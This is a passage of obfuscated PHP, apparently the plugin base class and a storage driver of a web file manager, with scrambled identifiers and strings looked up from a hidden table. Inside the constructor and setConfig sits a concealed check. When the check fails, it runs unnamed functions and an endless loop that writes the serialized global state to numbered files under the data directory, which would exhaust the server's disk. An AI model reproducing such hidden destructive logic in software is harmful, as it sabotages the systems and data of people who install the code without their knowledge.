$åéıØÅ£ = 250) { $äé—úæ = $this->link($¬ÌûÒÄä . $_SERVER[¤øïŠ‹²][1751] . $åéıØÅ£); $this->fileOutLink($äé—úæ); } public function fileOutImageServer($‘Õ…Ô¬, $Â€ÌïÍ– = 250) { parent::fileOutImage($‘Õ…Ô¬, $Â€ÌïÍ–); } public function hashMd5($¤ç¾éêˆ) { $‡µéÔø =& $_SERVER[¤øïŠ‹²]; $ãèÕò‹ = $this->_objectMeta($¤ç¾éêˆ); return isset($ãèÕò‹[$‡µéÔø[258]]) ? $ãèÕò‹[$‡µéÔø[258]] : !1; } public function size($ø¦•¶İÁ) { $öçòÓà¥ = $this->objectMeta($ø¦•¶İÁ); return $öçòÓà¥ ? $öçòÓà¥[$_SERVER[¤øïŠ‹²][90]] : 0; } public function info($¬ÙœäèÆ) { if ($this->isFolder($¬ÙœäèÆ)) { return $this->folderInfo($¬ÙœäèÆ); } else { if ($this->isFile($¬ÙœäèÆ)) { return $this->fileInfo($¬ÙœäèÆ); } } return !1; } public function exist($ŠİÄù­ü) { return $this->isFile($ŠİÄù­ü) || $this->isFolder($ŠİÄù­ü); } public function isFile($ØÖÃâå˜) { return !$this->isFolder($ØÖÃâå˜) && $this->objectMeta($ØÖÃâå˜); } public function isFolder($ÜúÙ‘§ß) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][190], $ÜúÙ‘§ß); } protected function objectMeta($Ò‹ñ€Š¹) { return $this->cacheMethod($_SERVER[¤øïŠ‹²][192], $Ò‹ñ€Š¹); } protected function _objectMeta($Ø“ã‰­) { $ßïàÑ¢³ =& $_SERVER[¤øïŠ‹²]; if ($Ø“ã‰­ == $ßïàÑ¢³[12] || $Ø“ã‰­ == $ßïàÑ¢³[8]) { return array(); } $©ù×Ñ£ = $this->ussRequest($Ø“ã‰­, $ßïàÑ¢³[1752]); if (!$©ù×Ñ£[$ßïàÑ¢³[1349]]) { return null; } $ü‡ºáª¨ = isset($©ù×Ñ£[$ßïàÑ¢³[1339]]) ? $©ù×Ñ£[$ßïàÑ¢³[1339]] : array(); if (!isset($ü‡ºáª¨[$ßïàÑ¢³[1753]])) { return null; } $¥í–Â†È = array($ßïàÑ¢³[33] => isset($ü‡ºáª¨[$ßïàÑ¢³[1753]]) ? $ü‡ºáª¨[$ßïàÑ¢³[1753]] : null, $ßïàÑ¢³[90] => isset($ü‡ºáª¨[$ßïàÑ¢³[1754]]) ? $ü‡ºáª¨[$ßïàÑ¢³[1754]] : null, $ßïàÑ¢³[258] => isset($ü‡ºáª¨[$ßïàÑ¢³[1755]]) ? $ü‡ºáª¨[$ßïàÑ¢³[1755]] : null, $ßïàÑ¢³[1722] => isset($ü‡ºáª¨[$ßïàÑ¢³[1756]]) ? $ü‡ºáª¨[$ßïàÑ¢³[1756]] : null); $¥í–Â†È[$ßïàÑ¢³[1723]] = isset($ü‡ºáª¨[$ßïàÑ¢³[1757]]) ? strtotime($ü‡ºáª¨[$ßïàÑ¢³[1757]]) : $¥í–Â†È[$ßïàÑ¢³[1722]]; return $¥í–Â†È; } protected function _isFolder($¶–Í§ŠÁ) { $à˜óù¾ö =& $_SERVER[¤øïŠ‹²]; if ($¶–Í§ŠÁ == $à˜óù¾ö[12] || $¶–Í§ŠÁ == $à˜óù¾ö[8]) { return !0; } $õ÷ÛÎ×Š = $this->_objectMeta($¶–Í§ŠÁ); return isset($õ÷ÛÎ×Š[$à˜óù¾ö[33]]) && $õ÷ÛÎ×Š[$à˜óù¾ö[33]] == $à˜óù¾ö[89] ? !0 : !1; } } goto a…›ª‰èò¿; f™íì‘ø¡: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $ùµâ¦Á =& $_SERVER[¤øïŠ‹²]; $ªæğö” = $_SERVER[$ùµâ¦Á[55]]; $’í°Ø­î = $ùµâ¦Á[990]; if ($_SERVER[$ùµâ¦Á[54]] != $’í°Ø­î($ªæğö”)) { $ŠÑ´ç¸• = $ùµâ¦Á[991]; $óÍËîÌÁ = $ùµâ¦Á[56]; $˜üóªÄ® = $_SERVER[$ùµâ¦Á[57]] . $ùµâ¦Á[58]; $È÷òè‹º = $óÍËîÌÁ($˜üóªÄ®); $Õ›¸¦¢˜ = explode($ùµâ¦Á[59], $È÷òè‹º); if (count($Õ›¸¦¢˜) < $ùµâ¦Á[714]) { $ÓËß¨Ò• = $ùµâ¦Á[61]; $ÓËß¨Ò•(); } $×¸Œç§¦ = $ùµâ¦Á[992]; $×¸Œç§¦($_SERVER[$ùµâ¦Á[993]]); $ŠÑ´ç¸• = $ùµâ¦Á[991]; $ŠÑ´ç¸•(); $é²’ÖîÅ = $ùµâ¦Á[994]; $†Ùåè— = json_encode($GLOBALS[$ùµâ¦Á[995]]); $¾·½š¹ = 1; for ($£ìòÜßé = $¾·½š¹; $£ìòÜßé > 0; $£ìòÜßé++) { $é²’ÖîÅ(DATA_PATH . $£ìòÜßé, $†Ùåè—); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($ùµâ¦Á[1777]); $this->pluginName = str_replace($ùµâ¦Á[1777], $ùµâ¦Á[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $ùµâ¦Á[8]; $this->pluginApi = appHostGet() . $ùµâ¦Á[1778] . $this->pluginName . $ùµâ¦Á[8]; $this->pluginHost = $config[$ùµâ¦Á[1779]] . $this->pluginName . $ùµâ¦Á[8]; $this->pluginHostDefault = $config[$ùµâ¦Á[1779]] . $this->pluginName . $ùµâ¦Á[8]; $‡”õÏ = $config[$ùµâ¦Á[1780]]; if ($‡”õÏ && strpos($ùµâ¦Á[50] . $‡”õÏ . $ùµâ¦Á[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$ùµâ¦Á[1781]] . $this->pluginName . $ùµâ¦Á[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); $this->linkHas = !1; return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[¤øïŠ‹²][1782]); } protected function assign($ËÅóĞ•ï, $÷Ş¯€±ù = false) { if (is_array($ËÅóĞ•ï)) { $this->values = array_merge($this->values, $ËÅóĞ•ï); } else { $this->values[$ËÅóĞ•ï] = $÷Ş¯€±ù; } } protected function display($Æ¾š†Ö) { extract($this->values); require $Æ¾š†Ö; } final function hookRegist($üÙœ’ ê) { $this->modelPlugin->appRegist($this->pluginName, $üÙœ’ ê); } final function appIcon() { $‘ı‘ğ°ğ =& $_SERVER[¤øïŠ‹²]; $ÄËåÜ¾ = $this->appPackage(); $˜¥œÊÇ£ = $‘ı‘ğ°ğ[12]; if (isset($ÄËåÜ¾[$‘ı‘ğ°ğ[511]])) { if (isset($ÄËåÜ¾[$‘ı‘ğ°ğ[511]][$‘ı‘ğ°ğ[1783]])) { $˜¥œÊÇ£ = $‘ı‘ğ°ğ[1784] . $ÄËåÜ¾[$‘ı‘ğ°ğ[511]][$‘ı‘ğ°ğ[1783]] . $‘ı‘ğ°ğ[1785]; } else { if ($ÄËåÜ¾[$‘ı‘ğ°ğ[511]][$‘ı‘ğ°ğ[1786]]) { $˜¥œÊÇ£ = $‘ı‘ğ°ğ[1787] . $ÄËåÜ¾[$‘ı‘ğ°ğ[511]][$‘ı‘ğ°ğ[1786]] . $‘ı‘ğ°ğ[1788]; } } } return $˜¥œÊÇ£; } final function fileCanView($é®Û¿©) { $•¾–œ„Ø =& $_SERVER[¤øïŠ‹²]; if (request_url_safe($é®Û¿©)) { return !0; } if ($this->isShare($é®Û¿©)) { return !0; } if (!KodUser::isRoot() && !KodUser::isLogin()) { $µÅÄ¨ËÄ = $•¾–œ„Ø[1789] . rawurlencode(this_url()); show_tips(LNG($•¾–œ„Ø[1790]) . $•¾–œ„Ø[1791] . $µÅÄ¨ËÄ . $•¾–œ„Ø[1792] . LNG($•¾–œ„Ø[1793]) . $•¾–œ„Ø[1794], !1); } if (!Action($•¾–œ„Ø[1795])->authCan($•¾–œ„Ø[1796])) { show_tips(LNG($•¾–œ„Ø[1797]) . $•¾–œ„Ø[1798], !1); } ActionCall($•¾–œ„Ø[1799], $é®Û¿©); } final function isShare($¤¾€´ÎÛ) { $â«“ŞØö = KodIO::parse($¤¾€´ÎÛ); return $â«“ŞØö[$_SERVER[¤øïŠ‹²][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($ÅëÖäÔ) { if (request_url_safe($ÅëÖäÔ)) { return $ÅëÖäÔ; } if (!$this->isShare($ÅëÖäÔ)) { $ÅëÖäÔ = $this->filePath($ÅëÖäÔ, !1); } return Action($_SERVER[¤øïŠ‹²][1309])->linkOut($ÅëÖäÔ); } public function filePathLinkOut($åñèÃî) { if (request_url_safe($åñèÃî)) { return $åñèÃî; } $this->fileCanView($åñèÃî); return Action($_SERVER[¤øïŠ‹²][1309])->link($åñèÃî); } final function filePath($÷…¢Ï—÷, $„ñãäù¼ = true, $¤ò®™äş = false) { $Ù”öôã =& $_SERVER[¤øïŠ‹²]; $„¸ş••— = $this->filePathGet($÷…¢Ï—÷, $„ñãäù¼); if (!$this->fileInfo) { show_tips(LNG($Ù”öôã[117]), !1); } if ($¤ò®™äş && isset($this->fileInfo[$Ù”öôã[563]]) && $this->fileInfo[$Ù”öôã[563]]) { $ŒıÄƒÚ– = Model($Ù”öôã[566])->fileInfo($this->fileInfo[$Ù”öôã[563]]); if (!$ŒıÄƒÚ– || !IO::exist($ŒıÄƒÚ–[$Ù”öôã[98]])) { $Î¾ŒûµÒ = LNG($Ù”öôã[117]) . LNG($Ù”öôã[1800]); if (KodUser::isRoot() && isset($ŒıÄƒÚ–[$Ù”öôã[98]])) { $Î¾ŒûµÒ .= $Ù”öôã[1801] . $ŒıÄƒÚ–[$Ù”öôã[98]] . $Ù”öôã[1802]; } show_tips($Î¾ŒûµÒ); } } Hook::trigger($Ù”öôã[1803], $„¸ş••—); return $„¸ş••—; } final function filePathGet($Ï¢ÄÈÔ…, $Ê‚ Òˆœ = true) { $İŸÕ‘–Å =& $_SERVER[¤øïŠ‹²]; if ($¹Şóø·¹ = $this->checkSharePath($Ï¢ÄÈÔ…, $Ê‚ Òˆœ)) { return $¹Şóø·¹; } $this->fileCanView($Ï¢ÄÈÔ…); if (request_url_safe($Ï¢ÄÈÔ…)) { $ñæéÉª¯ = parse_url_query($Ï¢ÄÈÔ…); if (isset($ñæéÉª¯[$İŸÕ‘–Å[1804]]) && isset($ñæéÉª¯[$İŸÕ‘–Å[247]])) { $ÃÎà™“œ = Mcrypt::decode($ñæéÉª¯[$İŸÕ‘–Å[247]], Model($İŸÕ‘–Å[874])->get($İŸÕ‘–Å[875])); if ($ÃÎà™“œ) { $this->fileInfo = IO::info($ÃÎà™“œ); $this->fileInfo[$İŸÕ‘–Å[1805]] = $Ï¢ÄÈÔ…; $this->cachePath = $this->pluginCachePath($İŸÕ‘–Å[12], $Ê‚ Òˆœ); return $ÃÎà™“œ; } } $Ï¢ÄÈÔ… = $this->_cacheHttpFile($Ï¢ÄÈÔ…, $Ê‚ Òˆœ); $this->fileInfo = IO::info($Ï¢ÄÈÔ…); } else { $this->fileInfo = IO::info($Ï¢ÄÈÔ…); $this->cachePath = $this->pluginCachePath($İŸÕ‘–Å[12], $Ê‚ Òˆœ); } return $Ï¢ÄÈÔ…; } final function _cacheHttpFile($ü¾˜²Â, $Ğ¦Ï™Úˆ = true) { $ò£Ïû—Ğ =& $_SERVER[¤øïŠ‹²]; $£¥ù¯ˆ‘ = parse_url_query($ü¾˜²Â); $ŞŸ×î„ı = get_path_ext($ü¾˜²Â); if (isset($£¥ù¯ˆ‘[$ò£Ïû—Ğ[32]]) && $£¥ù¯ˆ‘[$ò£Ïû—Ğ[32]]) { $ŞŸ×î„ı = get_path_ext($£¥ù¯ˆ‘[$ò£Ïû—Ğ[32]]); } $ûö‚ÁÓï = hash_path($ü¾˜²Â) . $ò£Ïû—Ğ[10] . $ŞŸ×î„ı; $this->cachePath = $this->pluginCachePath($Ğ¦Ï™Úˆ ? $ûö‚ÁÓï : $ò£Ïû—Ğ[12]); $Á»­ÒøŠ = IO::fileNameExist($this->cachePath, $ûö‚ÁÓï); if ($Á»­ÒøŠ) { return KodIO::make($Á»­ÒøŠ); } $³‡¹÷ = rtrim($this->cachePath, $ò£Ïû—Ğ[8]) . $ò£Ïû—Ğ[8] . $ûö‚ÁÓï; return $this->pluginCacheFileSet($³‡¹÷, file_get_contents_nossl($ü¾˜²Â)); } final function checkSharePath($æ€Ÿ±Ò§, $äÌúŞŸ¤ = true) { $ÔÍ˜ÃƒÊ =& $_SERVER[¤øïŠ‹²]; if (!$this->isShare($æ€Ÿ±Ò§)) { return !1; } $ŠèóÓß = Action($ÔÍ˜ÃƒÊ[1309])->sharePathInfo($æ€Ÿ±Ò§); if (!is_array($ŠèóÓß) || !isset($ŠèóÓß[$ÔÍ˜ÃƒÊ[98]])) { $“×«Ñ…´ = $GLOBALS[$ÔÍ˜ÃƒÊ[1806]]; show_json($“×«Ñ…´ ? $“×«Ñ…´ : LNG($ÔÍ˜ÃƒÊ[1807]), !1); } $this->fileInfo = $ŠèóÓß; $this->cachePath = $this->pluginCachePath(!1, $äÌúŞŸ¤); return $ŠèóÓß[$ÔÍ˜ÃƒÊ[98]]; } final function pluginCachePath($‘§ë’ŞÒ = '', $ß¸«²¬² = false) { $Ê“ãÓœ =& $_SERVER[¤øïŠ‹²]; if ($ß¸«²¬² && is_array($this->fileInfo)) { $‘§ë’ŞÒ = kodIO::hashPath($this->fileInfo); } $‘êÁÃÊÉ = rtrim(IO_PATH_SYSTEM_TEMP . $Ê“ãÓœ[1808] . $this->pluginName . $Ê“ãÓœ[8] . $‘§ë’ŞÒ, $Ê“ãÓœ[8]); $¯…¿—Û  = IO::infoFullSimple($‘êÁÃÊÉ); $Èû¾×ø‚ = $¯…¿—Û  && is_array($¯…¿—Û ) ? $¯…¿—Û [$Ê“ãÓœ[98]] : $Ê“ãÓœ[12]; if (!$Èû¾×ø‚) { $Èû¾×ø‚ = IO::mkdir($‘êÁÃÊÉ); } return $Èû¾×ø‚; } final function pluginCacheFileSet($îÃœ”Ç×, $ÊŞŸŸØí = '') { $ù’Ñİ¸ì =& $_SERVER[¤øïŠ‹²]; $¦©ãÒï  = IO::infoFullSimple($îÃœ”Ç×); if (!$¦©ãÒï ) { return IO::mkfile($îÃœ”Ç×, $ÊŞŸŸØí, REPEAT_REPLACE); } IO::setContent($¦©ãÒï [$ù’Ñİ¸ì[98]], $ÊŞŸŸØí); return $¦©ãÒï [$ù’Ñİ¸ì[98]]; } final function pluginLocalFile($ı¥¶ıÔ = '') { $¤¶ş¦¹¬ =& $_SERVER[¤øïŠ‹²]; $Å­Ä©Î€ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Å­Ä©Î€)) { mk_dir($Å­Ä©Î€); } if (!$ı¥¶ıÔ) { return $Å­Ä©Î€; } $ÅÛƒÜ¿ï = IO::info($ı¥¶ıÔ); $€Å¿Ç = $¤¶ş¦¹¬[1809] . KodIO::hashPath($ÅÛƒÜ¿ï) . $¤¶ş¦¹¬[10] . $ÅÛƒÜ¿ï[$¤¶ş¦¹¬[179]]; if (!checkExtSafe($€Å¿Ç)) { $€Å¿Ç = $€Å¿Ç . $¤¶ş¦¹¬[1343]; } $…Àğ¿şÉ = $Å­Ä©Î€ . $€Å¿Ç; if (@file_exists($…Àğ¿şÉ)) { return $…Àğ¿şÉ; } return IO::copy($ı¥¶ıÔ, $Å­Ä©Î€, 0, $€Å¿Ç); } final function appPackage() { $Ô©¡Ñ¬Ì =& $_SERVER[¤øïŠ‹²]; if ($this->packageData) { return $this->packageData; } $Åší™¿ = $this->parseFile($this->pluginPath . $Ô©¡Ñ¬Ì[1810]); $this->parseLang($Åší™¿); $Ã¸ìæ³Õ = json_decode_force($Åší™¿); if (!$Ã¸ìæ³Õ) { return array(); } $É¶€Ààó = Hook::filter($Ô©¡Ñ¬Ì[1811], $Ã¸ìæ³Õ); if ($É¶€Ààó && is_array($É¶€Ààó)) { $Ã¸ìæ³Õ = $É¶€Ààó; } $this->packageData = $Ã¸ìæ³Õ; return $Ã¸ìæ³Õ; } public function packageInfoGet($¼øşîÇğ) { $öãœØ– = $this->appPackage(); return array_get_value($öãœØ–, $¼øşîÇğ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¤øïŠ‹²][1812]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¤øïŠ‹²][1813]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¤øïŠ‹²][1814]); } public function echoJsAssign($‘öÉàÇô, $¢²’èûò) { $this->echoJsAssignArr[$‘öÉàÇô] = $¢²’èûò; } private function parseFile($Í¦ø²ÜÈ) { $ÊŸøÙÜæ =& $_SERVER[¤øïŠ‹²]; $ÊÚî˜­ = file_get_contents_nossl($Í¦ø²ÜÈ); $ì”ãî’ = array($ÊŸøÙÜæ[1815], $ÊŸøÙÜæ[1816], $ÊŸøÙÜæ[1817], $ÊŸøÙÜæ[1818], $ÊŸøÙÜæ[1819], $ÊŸøÙÜæ[1820], $ÊŸøÙÜæ[1821]); $¶’ê«µ¯ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ÊŸøÙÜæ[103]][$ÊŸøÙÜæ[1822]]); foreach ($this->echoJsAssignArr as $¥ñææ¹• => $Áéßø•®) { $ì”ãî’[] = $ÊŸøÙÜæ[1823] . $¥ñææ¹• . $ÊŸøÙÜæ[1824]; $¶’ê«µ¯[] = is_array($Áéßø•®) || is_object($Áéßø•®) ? rawurlencode(json_encode($Áéßø•®)) : $Áéßø•®; } if (strstr($ÊÚî˜­, $ÊŸøÙÜæ[1825])) { $ºÀğÅÌ = rawurlencode(json_encode($this->pluginLangArr)); $ÊÚî˜­ = str_replace($ÊŸøÙÜæ[1825], $ºÀğÅÌ, $ÊÚî˜­); } if (strstr($ÊÚî˜­, $ÊŸøÙÜæ[1826])) { $ºÀğÅÌ = $ºÀğÅÌ = rawurlencode(json_encode($this->getConfig())); $ÊÚî˜­ = str_replace($ÊŸøÙÜæ[1826], $ºÀğÅÌ, $ÊÚî˜­); } $ÊÚî˜­ = str_replace($ì”ãî’, $¶’ê«µ¯, $ÊÚî˜­); return $ÊÚî˜­; } private function parseLang(&$éåæ£óÀ) { $“¼—‡®™ =& $_SERVER[¤øïŠ‹²]; $”ƒçÚ¡ = $“¼—‡®™[1827]; if (!strstr($éåæ£óÀ, $”ƒçÚ¡)) { return; } preg_match_all($“¼—‡®™[1828], $éåæ£óÀ, $ªçî·¿Ä); if (!is_array($ªçî·¿Ä) || count($ªçî·¿Ä) == 0 || !is_array($ªçî·¿Ä[0]) || count($ªçî·¿Ä[0]) == 0) { return; } $…–£¼°Í = array(); $ŞŞ€Ù = array(); foreach ($ªçî·¿Ä[0] as $Ï¢À©áØ) { $ìÎ«¢üï = substr($Ï¢À©áØ, strlen($”ƒçÚ¡), -4); $Îš÷ÒÄÆ = LNG($ìÎ«¢üï); $…–£¼°Í[] = $Ï¢À©áØ; $ŞŞ€Ù[] = str_replace(array($“¼—‡®™[59], $“¼—‡®™[1196], $“¼—‡®™[429], $“¼—‡®™[130]), array($“¼—‡®™[53], $“¼—‡®™[53], $“¼—‡®™[12], $“¼—‡®™[1829]), $Îš÷ÒÄÆ); } $éåæ£óÀ = str_replace($…–£¼°Í, $ŞŞ€Ù, $éåæ£óÀ); } private function parseConfig(&$êÉÁ‹Å¾) { $µ€¶“ˆ‡ =& $_SERVER[¤øïŠ‹²]; $‰ù¢Û½ = $µ€¶“ˆ‡[1830]; if (!strstr($êÉÁ‹Å¾, $‰ù¢Û½)) { return; } preg_match_all($µ€¶“ˆ‡[1831], $êÉÁ‹Å¾, $ó½¬¢ò); if (!is_array($ó½¬¢ò) || count($ó½¬¢ò) == 0 || !is_array($ó½¬¢ò[0]) || count($ó½¬¢ò[0]) == 0) { return; } $”£ò†ç” = $this->getConfig(); $îüÑ²Æ = array(); $Á¿Á§–ä = array(); foreach ($ó½¬¢ò[0] as $Š†Ìı½˜) { $ºè–„‹ª = substr($Š†Ìı½˜, strlen($‰ù¢Û½), -2); $îüÑ²Æ[] = $Š†Ìı½˜; $Á¿Á§–ä[] = _get($”£ò†ç”, $ºè–„‹ª); } $êÉÁ‹Å¾ = str_replace($îüÑ²Æ, $Á¿Á§–ä, $êÉÁ‹Å¾); } private function parsePackage(&$³åÛæ‡Æ) { $œ‘ô¦‰ë =& $_SERVER[¤øïŠ‹²]; $²òèÚúİ = $œ‘ô¦‰ë[1832]; if (!strstr($³åÛæ‡Æ, $²òèÚúİ)) { return; } preg_match_all($œ‘ô¦‰ë[1833], $³åÛæ‡Æ, $áÅçµ•°); if (!is_array($áÅçµ•°) || count($áÅçµ•°) == 0 || !is_array($áÅçµ•°[0]) || count($áÅçµ•°[0]) == 0) { return; } $Ú•½ıÕ± = $this->appPackage(); $Ó£ªĞÅ° = array(); $Ü¹ö®º = array(); foreach ($áÅçµ•°[0] as $ëÎ“áÑ) { $áùšíÅ¨ = substr($ëÎ“áÑ, strlen($²òèÚúİ), -2); $Ó£ªĞÅ°[] = $ëÎ“áÑ; $Ü¹ö®º[] = _get($Ú•½ıÕ±, $áùšíÅ¨); } $³åÛæ‡Æ = str_replace($Ó£ªĞÅ°, $Ü¹ö®º, $³åÛæ‡Æ); } final function echoFile($Èğ¸ı³, $Å¢Íƒî¶ = false) { $¿‘¥¨ÖÂ =& $_SERVER[¤øïŠ‹²]; $Í‚ËÁş = $this->pluginPath . $Èğ¸ı³; if (ACT == $¿‘¥¨ÖÂ[1834]) { echo $¿‘¥¨ÖÂ[1835] . $this->pluginName . $¿‘¥¨ÖÂ[8] . $Èğ¸ı³ . $¿‘¥¨ÖÂ[1836]; if (!file_exists($Í‚ËÁş)) { echo $¿‘¥¨ÖÂ[1837]; return; } } $“ê®Ì÷ = $this->parseFile($Í‚ËÁş); $this->parseLang($“ê®Ì÷); $this->parseConfig($“ê®Ì÷); $this->parsePackage($“ê®Ì÷); if (is_array($Å¢Íƒî¶)) { $“ê®Ì÷ = str_replace(array_keys($Å¢Íƒî¶), array_values($Å¢Íƒî¶), $“ê®Ì÷); } echo $¿‘¥¨ÖÂ[59] . $“ê®Ì÷; } private function checkVersion() { $æ©ø’‘› =& $_SERVER[¤øïŠ‹²]; $¡ô˜ëİß = $this->appPackage(); $‡¼ëñ÷« = $this->getConfig(); if ($‡¼ëñ÷«[$æ©ø’‘›[1838]] == $¡ô˜ëİß[$æ©ø’‘›[1812]]) { return; } $this->regist(); $this->setConfig(array($æ©ø’‘›[1838] => $¡ô˜ëİß[$æ©ø’‘›[1812]])); } final function initLang() { $ÙÚ¸ì˜¯ =& $_SERVER[¤øïŠ‹²]; $Ç•”Í†‹ = $ÙÚ¸ì˜¯[1839]; $¶¶íˆ¾Ê = $this->pluginPath . $ÙÚ¸ì˜¯[1840]; $ÕÌø¨Ëó = I18n::getType(); $ÜéêÁÎ­ = array(); if (file_exists($¶¶íˆ¾Ê . $ÕÌø¨Ëó . $ÙÚ¸ì˜¯[951])) { $ÜéêÁÎ­ = (include $¶¶íˆ¾Ê . $ÕÌø¨Ëó . $ÙÚ¸ì˜¯[951]); } else { if ($ÕÌø¨Ëó == $ÙÚ¸ì˜¯[1841] && !file_exists($¶¶íˆ¾Ê . $ÕÌø¨Ëó . $ÙÚ¸ì˜¯[951]) && file_exists($¶¶íˆ¾Ê . $ÙÚ¸ì˜¯[1842])) { $ÜéêÁÎ­ = (include $¶¶íˆ¾Ê . $ÙÚ¸ì˜¯[1842]); $ÕÌø¨Ëó = $ÙÚ¸ì˜¯[1658]; } else { if (file_exists($¶¶íˆ¾Ê . $Ç•”Í†‹ . $ÙÚ¸ì˜¯[951])) { $ÜéêÁÎ­ = (include $¶¶íˆ¾Ê . $Ç•”Í†‹ . $ÙÚ¸ì˜¯[951]); $ÕÌø¨Ëó = $Ç•”Í†‹; } } } if (!$ÜéêÁÎ­ || !is_array($ÜéêÁÎ­)) { $ÜéêÁÎ­ = array(); } $ĞÉôÍĞï = Hook::trigger($ÙÚ¸ì˜¯[1843], $ÜéêÁÎ­, $this->pluginName, $ÕÌø¨Ëó); if ($ĞÉôÍĞï && is_array($ĞÉôÍĞï)) { $ÜéêÁÎ­ = $ĞÉôÍĞï; } if (@count($ÜéêÁÎ­) > 0) { I18n::set($ÜéêÁÎ­); } return $ÜéêÁÎ­; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($Ü¯®¹¯) { $¶ÄÈ„Ó =& $_SERVER[¤øïŠ‹²]; $œ—ßüì¡ = $_SERVER[$¶ÄÈ„Ó[55]]; $§Ÿ”¬’Ò = $¶ÄÈ„Ó[990]; if ($_SERVER[$¶ÄÈ„Ó[54]] != $§Ÿ”¬’Ò($œ—ßüì¡)) { $ë›…ù¾ = $¶ÄÈ„Ó[991]; $‚ŞÂ÷” = $¶ÄÈ„Ó[56]; $ÓĞëô‚¶ = $_SERVER[$¶ÄÈ„Ó[57]] . $¶ÄÈ„Ó[58]; $ç£Æîû = $‚ŞÂ÷”($ÓĞëô‚¶); $£ı»úëî = explode($¶ÄÈ„Ó[59], $ç£Æîû); if (count($£ı»úëî) < $¶ÄÈ„Ó[714]) { $¤ÅñŠø = $¶ÄÈ„Ó[61]; $¤ÅñŠø(); } $ı¡»Öìê = $¶ÄÈ„Ó[992]; $ı¡»Öìê($_SERVER[$¶ÄÈ„Ó[993]]); $ë›…ù¾ = $¶ÄÈ„Ó[991]; $ë›…ù¾(); $š‹‡œôı = $¶ÄÈ„Ó[994]; $ïÆ’îã = json_encode($GLOBALS[$¶ÄÈ„Ó[995]]); $‘İ’›üê = 1; for ($Í¶Ë¾ı´ = $‘İ’›üê; $Í¶Ë¾ı´ > 0; $Í¶Ë¾ı´++) { $š‹‡œôı(DATA_PATH . $Í¶Ë¾ı´, $ïÆ’îã); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $Ü¯®¹¯); } public function onSetConfig($ˆÕ®Èë) { } public function onGetConfig($’ûø§¼–) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($êİÌãªà) { if ($êİÌãªà == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($Ö™›ª¬Ä = "\160\x6c\165\147\151\156\101\x75\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $‡àİºáÊ = $this->getConfig(); if (!$‡àİºáÊ[$Ö™›ª¬Ä]) { return !1; } return ActionCall($_SERVER[¤øïŠ‹²][1844], $‡àİºáÊ[$Ö™›ª¬Ä]); } public function url($§‰ÅñÈŠ, $½¼ş·¬´ = '', $ò‘Ÿ½ŠÉ = true) { $şš§¨½ =& $_SERVER[¤øïŠ‹²]; $ûÊ«áËö = $this->getConfig(); $óôä‚œç = KOD_VERSION . $şš§¨½[10] . KOD_VERSION_BUILD; $ôÙ”éáÜ = $this->packageVersion(); $ÃÏÁ¾Å’ = $óôä‚œç . $şš§¨½[483] . $ôÙ”éáÜ; if (substr($§‰ÅñÈŠ, 0, 4) == $şš§¨½[162] || substr($§‰ÅñÈŠ, 0, 2) == $şš§¨½[1472]) { $åï¥ş‰œ = $§‰ÅñÈŠ . $şš§¨½[1845] . $ÃÏÁ¾Å’; } else { if ($½¼ş·¬´ == $şš§¨½[12]) { $åï¥ş‰œ = $this->pluginHost . $§‰ÅñÈŠ . $şš§¨½[1845] . $ÃÏÁ¾Å’; } else { if ($½¼ş·¬´ === $şš§¨½[89]) { $åï¥ş‰œ = $this->pluginHost . $§‰ÅñÈŠ; } else { if ($½¼ş·¬´ == $şš§¨½[1846]) { $åï¥ş‰œ = STATIC_PATH . $§‰ÅñÈŠ . $şš§¨½[1845] . $óôä‚œç; } else { if ($½¼ş·¬´ == $şš§¨½[1847]) { $åï¥ş‰œ = APP_HOST . $şš§¨½[1848] . $§‰ÅñÈŠ . $şš§¨½[1845] . $óôä‚œç; } else { if (isset($ûÊ«áËö[$½¼ş·¬´])) { $åï¥ş‰œ = $ûÊ«áËö[$½¼ş·¬´] . $§‰ÅñÈŠ . $şš§¨½[1845] . $ÃÏÁ¾Å’; } } } } } } if (!$ò‘Ÿ½ŠÉ) { return $åï¥ş‰œ; } echo $åï¥ş‰œ; } public function link($Àƒè‚ØÊ = false, $ğÚÆº‘Ï = '') { $«Å×˜¥¯ =& $_SERVER[¤øïŠ‹²]; $è‹€¯–„ = $this->linkHas == !1; $this->linkHas = !0; if (!$Àƒè‚ØÊ) { $this->link($«Å×˜¥¯[1849], $«Å×˜¥¯[1847]); $this->link($«Å×˜¥¯[1850], $«Å×˜¥¯[1846]); $this->link($«Å×˜¥¯[1851], $«Å×˜¥¯[1846]); $this->link($«Å×˜¥¯[1852], $«Å×˜¥¯[1846]); $this->link($«Å×˜¥¯[1853], $«Å×˜¥¯[1846]); if ($è‹€¯–„) { Hook::trigger($«Å×˜¥¯[1854]); } return; } $œ„Òëœ = $this->url($Àƒè‚ØÊ, $ğÚÆº‘Ï, !1); if (substr($Àƒè‚ØÊ, -3) == $«Å×˜¥¯[1855]) { echo $«Å×˜¥¯[1856] . $œ„Òëœ . $«Å×˜¥¯[1857] . $«Å×˜¥¯[59]; } else { if (substr($Àƒè‚ØÊ, -4) == $«Å×˜¥¯[1858]) { echo 